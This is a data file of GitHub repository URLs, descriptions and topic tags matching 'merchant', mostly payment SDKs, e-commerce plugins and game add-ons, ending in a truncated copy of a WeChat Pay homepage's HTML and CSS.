0,https://github.com/CaueFurui/O-Guia-Do-Comerciante-Das-Galaxias-Node.js.git,"Solution for Merchant, a Journey in Galaxys",,2
0,https://github.com/jonaphin/active_paypal_adaptive_accounts.git,PayPal Adaptive Accounts for Active Merchant,,2
0,https://github.com/AbdullahValley/Newspaper-Association.git,Merchant Management for a Newspaper Association.,,2
0,https://github.com/csc-egov/Bridge-Merchant-HTML-template.git,Sample HTML template for creating Merchant applications,,2
0,https://github.com/takehiro177/Kaggle-Elo-63th-Solution.git,Kaggle Elo Merchant Category Recommendation Competition,,2
0,https://github.com/Rebilly/merchant-category-codes.git,A library with merchant category codes.,,2
0,https://github.com/3rdex/stable-bank.git,Merchant payment solution on stable coins.,,2
0,https://github.com/zgabievi/laravel-bog-console.git,Bank of Georgia Merchant Console OpenAPI Helper,,2
0,https://github.com/theworkerant/QuantumGateway-4-ActiveMerchant.git,A quantum gateway module for active_merchant,,2
0,https://github.com/scout-2766/Iso4J.git,"Enhanced java enum for standards ISO 3166 (countries), ISO 4217 (currencies), ISO 639 (languages) + ISO18245 (Merchant Category Codes)",,2
0,https://github.com/ziggr/ESO-LibPrice.git,"{""ESO Add-on library for fetching price data from other add-ons such as Master Merchant or Arkadius' Trade Tools""}",,2
0,https://github.com/Byron/merchants-guide.git,An implementation of the merchants guide coding challenge in Rust the way I would love to see it,,2
0,https://github.com/breakthru2/Fargomine.git,Fargomine is a digital currency wallet and platform where merchants and consumers can transact with a digital currencies bitcoin.,,2
0,https://github.com/bporcelli/simplesalestax.git,Simple Sales Tax integrates TaxCloud and WooCommerce to make it easier for merchants to comply with sales tax laws.,,2
0,https://github.com/AndreasA/iso-payment-mpay24-wmbi.git,Isotope Payment Module for mPay24 WMBI (Webbased Merchant Billing Interface),,2
0,https://github.com/RazerMS/rms-mobile-xdk-xamarin-ios.git,Razer Merchant Services mobile payment for Xamarin (Native iOS),,2
0,https://github.com/be2bill/merchant-api-guidelines.git,The implementation recommandations for merchant API implementations in different languages,,2
0,https://github.com/mismith/cavirtex-php.git,"{""PHP wrapper for Canadian Virtual Exchange's Merchant API""}",,2
0,https://github.com/munisisazade/millikart-python.git,Milli Cart Merchant Payment Script for all Python websites,"payment,payment-request,millikart-python",2
0,https://github.com/TCK1997/7knots.git,A seafaring merchant game set in the 17th century.,,2
0,https://github.com/integrationmonitoring/moneta-c-sharp-sdk.git,C# SDK to create moneta merchant API driven application,,2
0,https://github.com/michaelschade/py-QBMS.git,An implementation of the Intuit¬Æ QuickBooks¬Æ Merchant Service API.,,2
0,https://github.com/igray/gsqbms.git,Quickbooks Merchant Services plug-in for WP e-Commerce,,2
0,https://github.com/unzerdev/java-sdk.git,Java SDK for integrating with Unzer Merchant Gateway ,,2
0,https://github.com/sscruggs/achdirect-active_merchant.git,Fork of active_merchant with ACHDirect support including echeck,,2
0,https://github.com/rubendivall/survey-opt-in-ps-17.git,Survey opt-in for Google Merchant Center Prestashop 1.7,,2
0,https://github.com/brendanhasz/loyalty-prediction.git,"{""Jupyter notebooks for Kaggle's Elo Merchant Category Recommendation""}",,2
0,https://github.com/VirtoCommerce/vc-module-MeS.git,Merchant e-Solutions (MeS) Payment Gateway integration module,,2
0,https://github.com/tbclla/laravel-revolut-merchant.git,"{""An unofficial Laravel wrapper for Revolut's Merchant API""}",,2
0,https://github.com/robksawyer/merchit.git,Converts the Squarespace Shop feed e.g. http://mysite.squarespace.com/shop?format=json-pretty into a parsable format that can be submitted to your Google Merchant Center (https://www.google.com/merchants).,,2
0,https://github.com/Alexintosh/pg.git,Decentralized Payment Gateway that enables Merchants to accept payments in GO and ERC20 tokens without being exposed to the volatility of the specific currency used during the transaction.,,2
0,https://github.com/meng1204/canada-wechat-alipay.git,Integrate Wechat Pay and Alipay through Alpha Pay Payment Gateway APIs. Allow Canadian merchants to easily accept Wechat Pay and Alipay for their E-commerce Platform.,,2
0,https://github.com/Arcadier/Minimum-Order-Quantity.git,"With this plug-in, merchants on your marketplace can specify a minimum number of order units for any of product inventory before a customer order is confirmed.","arcadier,plug-in,marketplace,bulk,orders",2
0,https://github.com/fraudlabspro/smsverification-magento2.git,FraudLabs Pro SMS Verification is an extension that help merchants to authenticate the client‚Äôs identity by sending them a SMS for verification in Magento 2.,"sms-verification,magento2,fraudlabspro,fraud-prevention,fraud-protection,fraud-detection,magento2-module,magento2-extension",2
0,https://github.com/bigbinary/binary_merchant.git,A payment processing utility tool built on top of Active Merchant,,2
0,https://github.com/Mrcomputer1/SmileyPlayerTrader.git,Allows you to trade with players using the villager merchant UI.,"spigot,bukkit,bukkit-plugin,spigot-plugin",2
0,https://github.com/ghassani/miva-provision.git,"{""Utilities, helpers, and wrappers for dealing with Miva Merchant Provisioning API's""}",,2
0,https://github.com/Tonku/Merchants-guide-to-the-galaxy-swift.git,"{""swift 2.2 implementation of puzzle Merchant's guide to the galaxy""}",,2
0,https://github.com/jonathonbyrdziak/Optimized-Magento-1.9.x.git,"Merchant Protocol has Optimized this Magento for higher conversion rates, SEO and speed",,2
0,https://github.com/apruve/apruve-ruby-demo.git,Demonstration of the apruve-ruby client library in a mock merchant website using Sinatra.,,2
0,https://github.com/SwedbankPay/swedbank-pay-sdk-mobile-example-merchant.git,The example website and API for the merchant backend of the iOS and Android SDKs,,2
0,https://github.com/asukhadi/litecoin-monitor.git,Monitor Litecoin for new transactions and initiate user-defined callbacks. Litecoin Merchant API,,2
0,https://github.com/jaredmell/Pagos-Online-Gateway-for-JigoShop.git,"Implementation for Pagos Online merchant, the leading payment gateway from Colombia",,2
0,https://github.com/JosefBud/lightspeed-amazon-sync.git,A Node.js app to sync inventory counts between Lightspeed Retail and an Amazon merchant account,,2
0,https://github.com/ResidualToken/unfederalreserve-merchantlobby.git,Smart contracts and code for unFederalReserve tokens and our new Merchant Banking Lobby.,,2
0,https://github.com/Sharnw/avored-merchant-warrior.git,Merchant Warrior card payments module for AvoRed Open Source Laravel Shopping Cart,,2
0,https://github.com/sinefunc/testopia.git,"a collection of test helpers for ohm, active merchant, rack test",,2
0,https://github.com/zixipay/zixipay.github.io.git,"ZixiPay Wallet API - Bitcoin Wallet API, Tether Wallet API, Ethereum Wallet API and Litecoin Wallet API, Crypto Payment API, Crypto Merchant Account, Crypto Payment API, Tether TRC20, Tether ERC20, Crypto Merchant Account","bitcoin-wallet-api,tether-wallet-api,ethereum-wallet-api,litecoin-wallet-api,tether-wallet,bitcoin-wallet,ethereum-wallet,litecoin-wallet,crypto-payment,crypto-payment-api,crypto-merchant-account,crypto-payment-gateway,wallet-services,accept-crypto-payments,zixipay-wallet-api,tether-trc20,tether-erc20,tether-omni,crypto-acquiring",2
0,https://github.com/goelrohan6/discoverMe.git,Making Everything nearby you more searchable as google does not plot everyone on map which is the need of the hour. It will also help merchants to get online and make themselves and their deals more searchble.,,2
0,https://github.com/TheToddLuci0/Tarkov-Scammer.git,"Uses the Tarkov-Market API to find things listed on the market for lower values than the selling price to in-game merchants, allowing for the scamming of less fortunate players.",,2
0,https://github.com/ghassani/miva-global-pre-render.git,Global Pre Render Module for Miva Merchant 5.5. Execute miva template logic before a screen begins to be rendered.,,2
0,https://github.com/ttcremers/GrayAutoSell.git,Vanilla World of Warcraft AddOn. Automatically sells all your gray bag items when you interact with a merchant.,"warcraft-addon,vanilla,bag,merchant",2
0,https://github.com/DreanorESOUI/SellOrnateItems.git,Addon for Elder Scrolls Online - Sells all items in the inventory to the merchant that give x% more gold.,"addon,gold,elder-scrolls-online,lua,inventory,esoui",2
0,https://github.com/ankitkanojia/Payment-Gateways.git,"A payment gateway is a merchant service provided by an e-commerce application service provider that authorizes credit card or direct payments processing for e-businesses, online retailers, bricks and clicks, or traditional brick and mortar.",,2
0,https://github.com/suzan-1515/Adversify-Client.git,Adversify - Offline Digital Advertisement and Marketing app developed for the final year college project. This project is an android application developed using JAVA programming language. This app is for client. Merchant app is on another repo.,"android,ble,nearby-connection,wireless-communication,room,java",2
0,https://github.com/StocksExchange/nodejs-client.git,"{""STEX (former Stocks.Exchange) provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in JSON. It's much easier to work with the API by using one of the clients provided by STEX, so while this page describes the API in case you want or need to build your own client, the examples use the Node JS client.""}",,2
0,https://github.com/cohortfsllc/dmclock.git,"Code that implements the dmclock distributed quality of service algorithm. See ""mClock: Hanling Throughput Variability for Hypervisor IO Scheduling"" by Gulati, Merchant, and Varman.",,2
0,https://github.com/Mvesesani/woocommerce-bulk-edit-product-image.git,This plugin adds an image selection option to the WooCommerce product bulk edit screen allowing the merchant to set an image to multiple products at once.,,2
0,https://github.com/seb86/wc-admin-notice-example.git,"{""Adds a note to the merchant's inbox showing dummy text and two action buttons. Can be used as a template for creating your own.""}",,2
0,https://github.com/kassent/BarterFix.git,"{""This is a SKSE plugin which fixes an issue where the player can't get any money from trading when merchant's golds reaches a certain value.""}",,2
0,https://github.com/successtar/jumga.git,Flutterwave code challenge for an Ideal E-commerce platform where merchant set up their platform with a token and have their shop running within seconds.,"fluuterwave,challenge,code,e-commerce,merchant",2
0,https://github.com/druglizard/grand-bazaar.git,"Grand Bazaar: Open-Source bitcoin merchant-trading platform, ebay/amazon like, with seller and buyer ratings, product reviews, resolution system, anonymity",,2
0,https://github.com/GillianShanks/moneydragon.git,Spending Tracker web app - to add spending that is tagged with a merchant and a type. Codeclan Week 5 ruby project.,,2
0,https://github.com/porousnapkin/TradeRL.git,"{""Building a roguelike where you play as a merchant setting up trade routes in a dangerous world. It's a Unity C# project.""}",,2
0,https://github.com/aaditya1111/e-commerce-website-for-Artisans..git,At this Website Any Artisan can sell their product as Merchant and purchase their Product as Costumer. It was developed by me during my summer internship.,,2
0,https://github.com/siteshop-ph/dragonpay-autocomplete-paid-order-for-woocommerce.git,"{""This plugin is ONLY for merchants that sell ONLY intangible items, it's need manual FTP install at root off your WP install (a new folder mu-plugin will be located within wp-content folder) not like common plugins , this plugin will not be displayed at all like other wp plugins in wp dasboard""}",,2
0,https://github.com/linseycurrie/Spending-Tracker.git,"First Solo Project using Python, Flask and PostgreSQL. It is a web application that allows users to input transactions linked to a date, merchant and category. These transactions can be saved, updated and deleted from the database. The User can also manipulate the transactions to see then based on criteria such as month, user, category and merchant. ","python,html,css,flask,postgresql,psycopg,rest,mvc,spending-tracker",2
0,https://github.com/MUTETHIA/IPAY-Integration-With-Codeigniter.git,"iPay is an innovative payments processing solution and payment gateway for Africa. iPay is an easy-to-use payments processing system that incorporates VISA, Mastercard, Kenswitch, M-PESA, Airtel Money & eLipa wallet modes of payment. Integrating with merchant is key if you have to receive payments",,2
0,https://github.com/ayushreal/PointOfSale.git,"The point of sale (POS) or point of purchase (POP) is the time and place where a retail transaction is completed. At the point of sale, the merchant calculates the amount owed by the customer, indicates that amount, may prepare an invoice for the customer (which may be a cash register printout), and indicates the options for the customer to make payment.","pointofsale,management-system,management-project,java-porject,core-java-projects",2
0,https://github.com/hasinichathu/POS.git,"At the point of sale, the merchant calculates the amount owed by the customer, indicates that amount, may prepare an invoice for the customer, and indicates the options for the customer to make payment.",,2
0,https://github.com/cpadsala/Queue-Me-In.git,"{""QmeIn - A Virtual 'Q' for All   Description:  QmeIn web application is designed for users to free themselves from the constraints of a physical line. QmeIn is a virtual queue that no longer requires the user to be present at a real queue at all times. With the tap of a button, a user places themselves in a virtual queue which proceeds as a real queue. Whether the queue is at the DMV, a bank, a restaurant, a stadium ticket counter, a parking lot, our own Titan bookstore, or the countless other locations that require people to stand in line, QmeIn will seamlessly do the waiting for the user.    Process:   QmeIn provides the user with a list of merchants who have queues currently open. The user can select a specific merchant and queue themselves in with a simple tap of the 'QmeIn' button. Once the user queues in, they are entered into a virtual queue and notified of their position, as well as an estimated time to the point of transaction. The user will, thus, be free from having to be present and waiting in a physical line allowing them to multi-task, or simply relax. As the queue proceeds, the user will be notified through an SMS when they are third from the point of transaction, thus giving them ample time to proceed to the physical line to complete their transaction.   When a merchant logs in to QmeIn, they are provided with a list of users currently in queue and the time elapsed on the current transaction. Once the merchant has completed the transaction with the current user, they will tap the 'Complete' button and remove that user from the queue. The queue then proceeds forward with the next user.    Highlights:  Before even entering a virtual queue, QmeIn provides information to the user on how many people are in the current queue for a merchant, as well as, their average time of transaction. This information can guide users to prudently allocate their time.   Users are not bound to a queue, just as a physical line, they can walk away from their position in line. In QmeIn, the user has the option to simply tap 'QmeOut' and walk away from the queue in a single step.   Future:  QmeIn will provide not only an effortless means to get in a queue for the user, but it will also provide critical data to merchants. As the number of queues and users within them increase, merchants will be able to obtain more accurate times of transaction for each user. The merchant will also become aware of time periods which occupy the highest number of transactions and the lowest. Furthermore, as 'QmeOut' data aggregates, the merchant will know when the highest number of users are lost to wait times. All this real-time data provided from QmeIn will guide merchants to more efficiently manage their labor and other assets.     Conclusion:  As software etches itself as a required element of our daily livelihood, QmeIn continues this momentum with an abstraction of reality. QmeIn manipulates the physical sense in a virtual environment to give physical freedom to its user. The web app removes constraints allowing users to allocate their physical being at their discretion and benefit.    Technologies Used:  Node.js, Express Framework, JavaScript, MongoDB, Mongoose, Handlebars, HTML 5, CSS 3""}",,2
0,https://github.com/SrimalPriyanga/epos-system.git,"Electronic Point of Sales System. --Point of sale (also called POS or checkout, during computerization later becoming electronic point of sale or EPOS) is the place where a retail transaction is completed. It is the point at which a customer makes a payment to the merchant in exchange for goods or services. At the point of sale the retailer would calculate the amount owed by the customer and provide options for the customer to make payment. The merchant will also normally issue a receipt for the transaction. (Definition uproot from Wikipedia)",,2
0,https://github.com/prophotos/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,2
0,https://github.com/rodyDevos/crowdservice.git,"Online job posting and freelance app 1. Search potential customers and bidders nearby from Map 2. Create a Job, Bid and award 3. Ask/Answer questions after bid job 4. Message between customer and provider 5. Escrow money to merchant account when awarding job and release money after job completed 6. Disput system 7. Facebook Login",,2
0,https://github.com/TusharMazhar/product-price-comparison.git,"{""Product Price Comparison shopping engines are channels for collecting product information, including pricing, from participating retailers and then display that collective information on a single results page in response to a shopper's search query. In this way, shoppers can compare prices, shipping options, and services from multiple retailers on a single page and choose the merchant that offers the best overall value.""}",,2
0,https://github.com/a-a-ahmed/pentbox1.8.git,"PenTBox is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. PenTBox is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.",,2
0,https://github.com/Rohan-Agrawal029/Medbazaar.git,"Medbazaar is a website that functions as a pharmaceutical metasearch engine. The website searches for medicines as requested by the user using the medicine name across various online pharmaceutical websites (like pharmeasy, medplus, netmeds etc.) and displays the relevant results sorted in increasing order of price. The user can be redirected to the ‚Äúmedicine details‚Äù page of the respective merchant website by clicking on the desired medicine. ",,2
0,https://github.com/AAlwajeeh/ArabicSF.git,"ArabicSF: is a C# application that is consists of a novel Arabic Stylometric Features Tool and other preproccessing tools which are inspired by other works such as Khoja stemmer, Light Stemmer, etc. - ***Note: This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. -  If you find this code useful, please cite the following paper:  - Mahmoud Al-Ayyoub, Ahmed Alwajeeh and Ismail Hmeidi. An extensive study of authorship authentication of Arabic articles. International Journal of Web Information Systems (IJWIS) 13(1), 2017. doi: 10.1108/IJWIS-03-2016-0011","arabic,text-processing,feature-extraction,preprocessing",2
0,https://github.com/LungProtocol/About-our-platfrom-.git,"INTRODUCTION   Lung protocol is a platform created for buyers and sellers all over the world.With an easy-to-use online store builder Platform, any seller is able to create their own storefront to sell their things, while making use of the Lung protocol platform‚Äôs wide range of features for a minimal fee.Our service offers great opportunities for self-employed and entrepreneurs, small scale manufacturers, family businesses and makers of handmade crafts, including a selection of tools for direct customer feedback, bookkeeping, sales analysis, advertising and promotion, as well as a convenient, user-friendly interface. lung protocol utilizes innovative technological features to guarantee the maximum security in all your transactions. Securely buy & sell anywhere with decentralized reputation & escrow using the L2P token.                                                                                       ABOUT PLATFORM   Lung protocol is a decentralized marketplace that allows anyone to buy and sell products or services for cryptocurrencies on a global scale. The marketplace will support thousands of merchants and millions of listings, with its primary focus on no fees. Sell and buy goods fast, secure and without commissions. Pay by crypto. Lung protocol is world‚Äôs largest decentralized, peer-to-peer marketplace. The computational efficiency of our protocol is powered by key code design features like forward and backward compatibility, component-based modular structure, and asynchronous core architecture. We are focused on bringing the benefits of this new disruptive technology to future facing enterprises that recognize its trans formative role in bringing real‚Äëworld commercial advantage. Lung protocol is a platform created for buyers and sellers all over the world. With an easy-to-use online store builder Platform, any seller is able to create their own storefront to sell their things, while making use of the Lung protocol platform‚Äôs wide range of features for a minimal fee. Our service offers great opportunities for self-employed and entrepreneurs, small scale manufacturers, family businesses and makers of handmade crafts, including a selection of tools for direct customer feedback, bookkeeping, sales analysis, advertising and promotion, as well as a convenient, user-friendly interface. Lung Protocol (L2P) powers our merchant storefronts and e-commerce ecosystem. Sell and buy goods fast, secure and without commissions. Pay by crypto.                                                                                            OUR VISION                                                                                  Our main intention is not to replace Fiat currency however, we aim to provide a unique approach to creating an ecosystem unattached to the current inflationary model. As we all know, Fiat currency is the foundational currency in which our society operates on a daily basis. Lung Protocol provides a reliable, stable and tax-exempt cryptocurrency to enable seamless transactions. A limited supply currency hosting safer transactions in an ecosystem that allows the token holders to have full control of their finances at all times. A limited supply currency in which there is no third-party requiring permission to interact with Lung Protocol (L2P).                                                                                    TOKEN INFORMATION                                                                                            Token Name  :Lung Protocol                                                                                       Token symbol  :L2P                                                                                           Token type  :ERC20                                                                                      Token contract  :0xee0f286776639cd363da810daf3e0623f82576b0                                                                                      Token Decimal  :18                                                                                        Token Supply  :750000000                                                                                                  USEFUL LINKS                                                                                                             1. https://t.me/LungProtocol_Group                                                                                                         2. https://t.me/LungProtocol_Channel                                                                                                         3. https://twitter.com/lungprotocol                                                                                                         4. https://medium.com/@lungprotocol                                                                                                         5. https://web.facebook.com/lungProtocol                                                                                                         6. https://github.com/LungProtocol                                                                                                         7. https://www.linkedin.com/company/lungprotocolinfo/                                                                                                                                                                                  EXCHANGE                                                                                        1. CryptloCEX  http://cryptlocex.com/                                                                                    2. Switchdex http://switchdex.com/                                                                                    3. Bolddax http://bolddax.com/                                                                                    4. exnce http://exnce.com/                                                                                                                                                             Ongoing till 10th July   Lung Protocol decide to arrange a self drop program to deliver an amazing eCommerce platform. As you all know for an e commerce platform community is the power to archive success for the future as well as you will be benefited by this path way there is a great chance to make money whatever you want in crypto exchange after lunching your favorite L2P in the open market. This concept will bring you a financial freedom world. Dear respectable community Lung Protocol is an ERC20 token now that is under ETHEUREUM block chain but very soon Lung Protocol will lunch main net for community betterment and to create the main vision in eCommerce sector.                                                         SELFDROP          ",,2
0,https://github.com/mosfeqanik/Payment-Gateway-with-invoice-printing-system.git,"implemented a system Created a User Registration form (User name, Password, Address, Email) and login panel.After Successful login user will land to Dashboard. In Dashboard create menu for Create Customer, Create Product, Create Invoice and View Invoice.Create a form for ‚ÄúCreate Customer‚Äù (Customer Name, Address, email), Create Product (Product name, Category, description), Create Invoice (see Attachment 01 for help).Designed database as you need to store data. In ‚ÄúView Invoice‚Äù Display the list of invoice created already. User Can View any invoice from list like a report.Integrated a Payment Method Stripe for making payment to the Merchant Account on that particular Invoice. Send Payment Confirmation (Money receipt) email to Customer email address after successful payment.I used Raw PHP or Laravel framework Mysql. ",,2
0,https://github.com/BlockchainLabs/CannabisCoin.git,"Cannabis Coin What is CannabisCoin or CANN?  Cannabis Coin is a peer-to-peer Internet digital currency that enables instant payments to anyone in the world.  It is based on the Bitcoin protocol but differs from Bitcoin in that it can be efficiently mined with consumer-grade hardware.  CannabisCoin is the payment solution for Marijuana dispensaries, retailers and merchants.  CannabisCoin crypto currency is backed by Marijuana where it is accepted.  CANN is the symbol we use to represent the Cannabis Coin in trade platforms such as Bittrex Exchange  What is the ‚ÄúYes We CANN‚Äù movement?  The Yes We CANN movement is about medical marijuana dispensaries and shop owners that participate in providing safe, affordable, and quality medicine utilizing CannabisCoin as payment. This movement is a way for dispensaries and shop owners to show their appreciation to their patients by donating some medication into the ‚ÄúCANNdy‚Äù inventory.  What is CANNdy?  CANNdy is a supply of meds that consists of strains grown specifically for CannabisCoin purchases and/or strains that can be purchased at the rate of 1 Cannabis Coin (CANN) to approx. 1 GRAM of medication.  Cannabis / Marijuana Facts  20 states in the US have legalized cannabis for medical purposes. Colorado and Washington state also permit recreational use of marijuana.  There are two very distinct groups of marijuana strains. One is cannabis; the other is hemp.  We are CANNABIS!  Cannabis is potent medicine courtesy of high amounts of CBD, medicinal terpenes, and flavonoids. It also contains varying amounts of THC. The higher the THC, the more pronounced its psychoactive effects.  What is the meaning of 420?  Straight from Wikipedia, the free encyclopedia  420, 4:20, or 4/20 (pronounced four-twenty) is a code-term that refers to the consumption of cannabis and by extension, as a way to identify oneself with cannabis subculture or simply cannabis itself.  Observances based on the number 420 include smoking cannabis around the time 4:20 p.m.  (with some sources also indicating 4:20 a.m.[1][2]) on any given day, as well as smoking and celebrating cannabis on the date April 20 (4/20 in U.S. form)",,2
0,https://github.com/geeksourcecodes/math.git,"The MIT License (MIT)  Copyright (c) 2013-present Benjamin Morel  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,2
0,https://github.com/witcherxd/witcher-guard-bot-v12.git,"MIT License  Copyright (c) 2021 Witcher Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,2
0,https://github.com/opoplmm/test1.git,"<html><head>         <meta name=""baidu-site-verification"" content=""1jPmULtLtZ"">         <meta charset=""utf-8"">         <meta http-equiv=""X-UA-Compatible"" content=""IE=9"">         <title>ÂæÆ‰ø°ÊîØ‰ªò - ‰∏≠ÂõΩÈ¢ÜÂÖàÁöÑÁ¨¨‰∏âÊñπÊîØ‰ªòÂπ≥Âè∞ ÔΩú ÂæÆ‰ø°ÊîØ‰ªòÊèê‰æõÂÆâÂÖ®Âø´Êç∑ÁöÑÊîØ‰ªòÊñπÂºè</title>         <meta name=""keywords"" content=""ÂæÆ‰ø°ÊîØ‰ªò,ÂæÆ‰ø°,ÊîØ‰ªò,ÁßªÂä®ÊîØ‰ªò,ÊâãÊú∫ÊîØ‰ªò,ÂæÆÊîØ‰ªò,ÂæÆ‰ø°ÊîØ‰ªòÂºÄÈÄö,ÂæÆ‰ø°ÊîØ‰ªòÊé•ÂÖ•,ÂæÆ‰ø°ÊîØ‰ªòÁî≥ËØ∑,ÂæÆ‰ø°ÊîØ‰ªòÂÆòÁΩë,ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞,ÂæÆ‰ø°ÊîØ‰ªòÊé•Âè£ÂºÄÂèë,ÂæÆ‰ø°ÊîØ‰ªòÊé•Âè£Áî≥ËØ∑,ÂæÆ‰ø°ÊîØ‰ªòÂÆ¢Êúç,ÂæÆ‰ø°ÊîØ‰ªòÁôªÂΩï"">         <meta name=""description"" content=""ÂæÆ‰ø°ÊîØ‰ªòÊòØËÖæËÆØÂÖ¨Âè∏ÁöÑÊîØ‰ªò‰∏öÂä°ÂìÅÁâåÔºåÂæÆ‰ø°ÊîØ‰ªòÊèê‰æõÂÖ¨‰ºóÂè∑ÊîØ‰ªò„ÄÅAPPÊîØ‰ªò„ÄÅÊâ´Á†ÅÊîØ‰ªò„ÄÅÂà∑Âç°ÊîØ‰ªòÁ≠âÊîØ‰ªòÊñπÂºè„ÄÇÂæÆ‰ø°ÊîØ‰ªòÁªìÂêàÂæÆ‰ø°ÂÖ¨‰ºóË¥¶Âè∑ÔºåÂÖ®Èù¢ÊâìÈÄöO2OÁîüÊ¥ªÊ∂àË¥πÈ¢ÜÂüüÔºåÊèê‰æõ‰∏ì‰∏öÁöÑ‰∫íËÅîÁΩë+Ë°å‰∏öËß£ÂÜ≥ÊñπÊ°àÔºåÂæÆ‰ø°ÊîØ‰ªòÊîØÊåÅÂæÆ‰ø°Á∫¢ÂåÖÂíåÂæÆ‰ø°ÁêÜË¥¢ÈÄöÔºåÊòØÁßªÂä®ÊîØ‰ªòÁöÑÈ¶ñÈÄâ„ÄÇ"">         <link rel=""shortcut icon"" href=""https://wx.gtimg.com/core/favicon.ico"" type=""image/x-icon"">         <style>             body,ol,ul,h1,h2,h3,h4,h5,h6,p{margin:0;padding:0;}             body{min-width:1200px;font:14px ""Helvetica Neue"",""Hiragino Sans GB"",""Microsoft YaHei"",""\\9ED1\\4F53"",Arial,sans-serif;background:#fff;-webkit-text-size-adjust:100%;color:#222;}             a{color:#459ae9;text-decoration:none;}             a:hover{color:#459ae9;text-decoration:underline;}             i,em{font-style:normal;}             strong{font-weight:normal;}             li{list-style:none;}             img{border:0;vertical-align:middle;}             table{border-collapse:collapse;border-spacing:0;}             .hide{display:none;}             .red{color:#ff0000;}              .login-form label,.cbx,.guide-main-li-ico,.warn,.ico-new,.ico-right{background:url(https://wx.gtimg.com/pay/img/home/base.png?v=20160112) no-repeat;}              .clr:after{content:""."";clear:both;display:block;height:0;visibility:hidden;}             .clr{zoom:1;}             .hide{display:none;}             .vs{margin:0 10px;font-family:arial;color:#ccc;}              .cbx{width:16px;height:16px;display:inline-block;margin:-3px 6px 0 0;*margin-top:0;vertical-align:middle;cursor:pointer;overflow:hidden;}             .cbx{background-position:0 -54px;}             .cbx-on{background-position:0 -80px;display:inline-block;}              .wrap{width:1025px;margin:0 auto;overflow:hidden;zoom:1;}             .container{margin:25px auto;}             .topbar{height:33px;line-height:33px;color:#999;background:#f6f6f6;border-bottom:1px solid #dcdcdc;font:12px/33px tahoma,arial,""Hiragino Sans GB"",\\5B8B\\4F53,sans-serif;}             .topbar a{color:#00c901;}              .header{position:relative;z-index:99;background-color:#fff;/*border-top:4px solid #44b549;*/border-bottom:1px solid #d9dadc;}             .header .wrap{height:60px;position:relative;overflow:visible;z-index:999}             .header .logo{float:left;width:232px;overflow:hidden;}             .header .logo a{display:block;height:40px;margin-top:12px;text-indent:-999px;background:url(https://wx.gtimg.com/pay/img/common/logo.png?v=20160114) no-repeat}             .header .link{float:right;line-height:60px;}             .header .link a{color:#222;}             .header .link a:hover{color:#459ae9}             .header .pole-msg{display:inline-block;*display:inline;position:relative;}             .header .pole-msg a.content-us{display:inline-block;width:75px;height:60px;position:relative;z-index:9;}             .header .pole-msg a.content-us:hover{color:#222;text-decoration:none;}             .header .pole-msg.show-popup a.content-us{background:#fff;border-left:1px solid #e7e7eb;border-right:1px solid #e7e7eb;padding-left:16px;margin:0 -1px 0 -17px;*left:-17px;}             .header .popup{display:none;position:absolute;top:59px;left:-97px;border:1px solid #e7e7eb;z-index:8;width:131px;}             .header .show-popup .popup{display:block;line-height:26px;padding:14px 20px;background:#fff;}             .header .show-popup .popup p{font-size:12px;color:#999}             .header .show-popup .popup p.tel{color:#333333;font-size:17px;}             .header .show-popup .popup .bor-top{border-top:1px solid #e7e7eb;margin-top:10px;padding-top:10px;}             .header .dropdown-arrow{position:absolute;right:6px;top:29px;border-color:#c2c2c2 transparent transparent;border-style:solid dashed dashed;border-width:4px 4px 0;font-size:0;height:0;width:0;line-height:0;}             .header .show-popup .dropdown-arrow{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-o-transform:rotate(180deg);transform:rotate(180deg);-webkit-transition:all .25s ease 0s;-moz-transition:all .25s ease 0s;-o-transition:all .25s ease 0s;transition:all .25s ease 0s;}              .footer{text-align:center;padding-bottom:20px;color:#999999;font:12px/1.6 tahoma,arial,""Hiragino Sans GB"",\\5B8B\\4F53,sans-serif;}             .footer p{margin-bottom:8px;}             .footer a{color:#999999;}             .footer a:hover{color:#459ae9}              .banner{height:410px;position:relative;}             .banner 